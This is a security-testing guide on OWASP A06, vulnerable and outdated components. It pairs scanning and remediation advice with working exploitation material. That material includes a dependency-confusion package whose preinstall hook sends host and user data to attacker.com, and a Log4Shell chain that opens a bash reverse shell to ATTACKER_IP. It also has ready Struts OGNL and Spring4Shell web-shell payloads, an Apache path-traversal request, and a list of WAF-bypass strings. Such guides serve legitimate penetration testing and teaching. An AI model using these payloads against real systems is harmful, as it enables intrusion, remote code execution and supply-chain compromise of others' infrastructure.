# A06: Vulnerable and Outdated Components

OWASP #6. Only category with no CVEs mapped to CWEs directly.
CWEs: CWE-1104, CWE-1035, CWE-937.
Covers known vulnerabilities in libraries, frameworks, and other software components.

---

## Overview

Using components with known vulnerabilities—libraries, frameworks, OS, application
servers—means a single public CVE can compromise your application. The attack is
passive: attackers scan for known vulnerable versions and apply existing exploits.

**Attack classes:**
- Known CVE exploitation in libraries
- Dependency confusion attacks
- Outdated/unmaintained libraries
- SCA (Software Composition Analysis) gaps
- Transitive dependency vulnerabilities

---

## Detection Methods

```bash
# JavaScript/Node.js
npm audit
npm audit --json | python3 -m json.tool | grep -E "severity|title|url"
npx snyk test

# Python
pip-audit
safety check
snyk test --file=requirements.txt

# Java
mvn dependency-check:check
gradle dependencyCheckAnalyze

# Ruby
bundle audit
bundle audit check --update

# PHP
composer audit

# Multi-language
snyk test
semgrep --config auto .

# OS packages
apt list --installed 2>/dev/null | grep -E "apache|nginx|php|mysql|openssl"
dpkg -l | awk '{print $2,$3}' | xargs -I{} sh -c 'echo {} | apt-cache show {} 2>/dev/null | grep CVE' 

# Identify version from HTTP headers
curl -I https://target.com | grep -E "Server:|X-Powered-By:|X-AspNet-Version:"

# Banner grabbing
nmap -sV target.com
nmap --script=banner target.com -p 80,443,8080,8443
```

---

## What to Look For

**Version disclosure:**
- `Server: Apache/2.4.29 (Ubuntu)` → check CVEs for 2.4.29
- `X-Powered-By: PHP/7.2.0` → EOL PHP
- `X-AspNet-Version: 4.0.30319` → .NET version
- Readme files in web root with version numbers
- JavaScript libraries with version in filename: `jquery-1.12.4.min.js`
- `package.json`, `requirements.txt`, `pom.xml` if exposed

**High-risk package categories:**
- Image processing: ImageMagick, Pillow (frequent RCE CVEs)
- XML parsers: libxml2, JAXP (XXE)
- Serialization: Jackson, XStream, Java native serialization
- Authentication: Apache Shiro, Spring Security (auth bypass)
- Expression language: OGNL, SpEL, JEXL (injection → RCE)

**Dependency confusion targets:**
- Private package names that also exist (or could be registered) on public PyPI/npm
- Internal package names visible in error messages or package.json

---

## Testing Methodology

### 1. Version Fingerprinting
```bash
# Web server
curl -I https://target.com 2>/dev/null | grep -iE "Server:|X-Powered-By:|X-Generator:"

# JS library detection
curl -s https://target.com | grep -oE "(jquery|angular|react|vue|bootstrap)[^\"']*(\.js|\.min\.js)" | sort -u
# Or use Wappalyzer browser extension

# Retire.js scan
retire --url https://target.com
retire --js /path/to/js/files/

# favicon hash (identifies technologies)
curl -s https://target.com/favicon.ico | md5sum
# Match against database: https://wiki.owasp.org/index.php/OWASP_favicon_database

# Technology fingerprinting
whatweb https://target.com -v
wapiti -u https://target.com --modules web_technology
```

### 2. CVE Exploitation Workflow
```bash
# Step 1: Identify technology + version
curl -I https://target.com | grep Server
# Server: Apache/2.4.49

# Step 2: Search for CVEs
searchsploit apache 2.4.49
# or:
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keyword=apache+2.4.49&resultsPerPage=20" \
  | python3 -m json.tool | grep -E '"id"|"descriptions"'

# Step 3: Get PoC
searchsploit -m 50383    # Copy to current dir
# or: look up on GitHub for PoC repos

# Step 4: Validate (CVE-2021-41773 example)
curl -s --path-as-is "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# Shodan to find instances at scale:
# shodan search 'Apache 2.4.49' --fields ip_str,port
```

### 3. Dependency Confusion Attack
```bash
# Step 1: Find internal package names
# - Error messages showing package names
# - package.json in .git repo
# - build logs, CI configs
# - npm install error messages

# Step 2: Check if name available on public registry
npm info INTERNAL_PACKAGE_NAME  # "Not found" = can register it
pip3 install INTERNAL_PACKAGE --dry-run  # Error = not on PyPI

# Step 3: Register malicious package with HIGHER version
# Internal package: mycompany-utils v1.0.0
# Register on npm: mycompany-utils v9.0.0 (higher version wins by default!)
# Include in package.json:
{
  "name": "mycompany-utils",
  "version": "9.0.0",
  "description": "INTERNAL PACKAGE",
  "scripts": {
    "preinstall": "curl http://attacker.com/callback?host=$(hostname)&user=$(whoami)"
  }
}

# Step 4: Wait for CI/CD to install it
# Package managers prefer public registry for packages also in private registry
# unless scope is explicitly configured (e.g., @company/package-name)
```

### 4. SCA and SBOM Analysis
```bash
# Generate SBOM
syft /path/to/application -o json > sbom.json
# or: cyclonedx-py --output=sbom.xml

# Scan SBOM for vulnerabilities
grype sbom:sbom.json --output table
osv-scanner --sbom sbom.json

# Dependency-Track (enterprise SBOM management)
# Upload SBOM to Dependency-Track, auto-flags vulnerable components

# OWASP Dependency-Check (Java/Python/Node)
dependency-check.sh --project "MyApp" --scan /path/to/app --format HTML

# Trivy - container image scanning
trivy image nginx:1.18
trivy image --severity HIGH,CRITICAL nginx:1.18

# Grype - syft-based vulnerability scanner
grype dir:/path/to/app
grype python:3.9-slim
```

### 5. Log4Shell (CVE-2021-44228) Detection
```bash
# Test if target vulnerable to Log4Shell
# Payload: ${jndi:ldap://CALLBACK_HOST/test}

# Insert in any logged field: User-Agent, X-Forwarded-For, username, etc.
curl -H "User-Agent: \${jndi:ldap://COLLABORATOR_ID.oast.me/a}" https://target.com/
curl -H "X-Forwarded-For: \${jndi:ldap://COLLABORATOR_ID.oast.me/a}" https://target.com/
curl -d "username=\${jndi:ldap://COLLABORATOR_ID.oast.me/a}&password=x" https://target.com/login

# Or with obfuscation (bypass WAF):
curl -H "User-Agent: \${j\${::-n}di:ldap://COLLABORATOR.oast.me/a}" https://target.com/
curl -H "User-Agent: \${jndi:\${lower:l}dap://COLLABORATOR.oast.me/a}" https://target.com/
curl -H "User-Agent: \${jndi:dns://COLLABORATOR.oast.me/a}" https://target.com/

# Check Collaborator/interactsh for DNS callback
```

---

## Exploitation Techniques

### Log4Shell RCE
```bash
# Setup JNDI exploit server
git clone https://github.com/feihong-cs/JNDIExploit.git
cd JNDIExploit
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ATTACKER_IP -l 1389 -p 8888

# Payload:
${jndi:ldap://ATTACKER_IP:1389/Basic/Command/Base64/$(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64)}

# Via User-Agent:
curl -H "User-Agent: \${jndi:ldap://ATTACKER_IP:1389/exploit}" https://target.com/

# Set up listener:
nc -lvnp 4444
```

### Apache Struts OGNL Injection (CVE-2017-5638)
```bash
# Equifax breach vector
curl -X POST https://target.com/struts2-showcase/showcase.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(new+java.io.PrintWriter(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).flush())}" \
  -F "upload=@/dev/null"
```

### Spring4Shell RCE (CVE-2022-22965)
```bash
# Requires: Spring Framework < 5.3.18 or < 5.2.20 + Java 9+ + Tomcat
curl -X POST "https://target.com/spring/greeting" \
  --data "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
# Then access: https://target.com/tomcatwar.jsp?pwd=j&cmd=id
```

---

## Verification

```bash
# Verify vulnerable component
# Get version from response headers or visible content
curl -I https://target.com 2>/dev/null | grep -iE "server|powered"
# Apache/2.4.49 → CVE-2021-41773 → test path traversal

# Verify patch level
# After finding version, check NVD:
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cpeName=cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*" \
  | python3 -m json.tool | grep '"id"'

# Confirm exploitation works
curl -s --path-as-is "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# Root:x:0:0 in response → path traversal RCE possible
```

---

## Common Problems & Solutions

| Problem | Risk | Fix |
|---------|------|-----|
| No dependency inventory | Unknown vulnerabilities | Maintain SBOM, auto-scan on every build |
| No automated CVE monitoring | Delayed patch cycles | Subscribe to NVD/OSV alerts for used components |
| Using unmaintained libraries | No patches ever | Replace with maintained alternatives |
| Transitive deps not tracked | Hidden vulnerabilities | SCA tools scan full dependency tree |
| No version pinning | Unexpected upgrades | Pin exact versions in lockfiles |
| Dependency confusion | Supply chain compromise | Use scoped packages, private registry mirrors |
| Version exposed in headers | Attack surface revealed | Remove version from Server/X-Powered-By headers |

---

## Tools (with Commands)

```bash
# npm audit (Node.js)
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical") | .key,.value.range'

# pip-audit (Python)
pip-audit --requirement requirements.txt --format json

# OWASP Dependency-Check
dependency-check.sh --project test --scan . --out report/ --format ALL

# Trivy (containers + filesystems)
trivy image --severity CRITICAL,HIGH ubuntu:20.04
trivy fs --severity CRITICAL,HIGH /path/to/project

# Grype
grype .              # scan current directory
grype dir:/app       # scan directory
grype sbom:sbom.json # scan SBOM

# Retire.js
retire --js /path/to/js --outputformat json

# Snyk
snyk test
snyk container test nginx:latest
snyk code test

# OSV-Scanner (Google)
osv-scanner -r /path/to/repo

# searchsploit (Exploit-DB)
searchsploit apache 2.4.49
searchsploit log4j
searchsploit -x 50383   # examine exploit
```

---

## Bypass Techniques

### Log4Shell WAF Bypass
```
# Case variation
${JnDi:ldap://attacker.com/a}

# Lower/upper functions
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}

# Nested variables
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}

# URL encoding
${jndi:ldap://attacker.com%2fa}

# Unicode
${jndi:ldap://attacker.com/\u0061}

# All protocols for DNS-only environments
${jndi:dns://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:corba://attacker.com/a}
${jndi:iiop://attacker.com/a}
```

---

## Remediation

```bash
# Setup automated scanning in CI/CD
# .github/workflows/security.yml:
name: Security Scan
on: [push, pull_request]
jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'   # Fail build on critical vulnerabilities

# Renovate/Dependabot auto-update
# .github/dependabot.yml:
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

## Real-World CVEs

| CVE | Component | Vulnerability | Impact |
|-----|-----------|--------------|--------|
| CVE-2021-44228 | Log4j 2.x | JNDI injection → RCE | ~10M servers, critical |
| CVE-2022-22965 | Spring Framework | Class loader manipulation | RCE |
| CVE-2017-5638 | Apache Struts | OGNL injection | Equifax breach, 147M SSNs |
| CVE-2019-2725 | Oracle WebLogic | Deserialization | RCE, ~130K servers |
| CVE-2021-26084 | Confluence | OGNL injection | RCE, ~7K servers in 24h |
| CVE-2021-21985 | VMware vCenter | RCE | Mass exploitation |
| CVE-2021-22205 | GitLab | Image parsing (ExifTool) | RCE without auth |
| CVE-2020-1472 | Zerologon | Netlogon crypto flaw | Full domain compromise |
| 2021 Dependency Confusion | npm/PyPI/RubyGems | Confusion attacks | 35 companies tested by researcher |
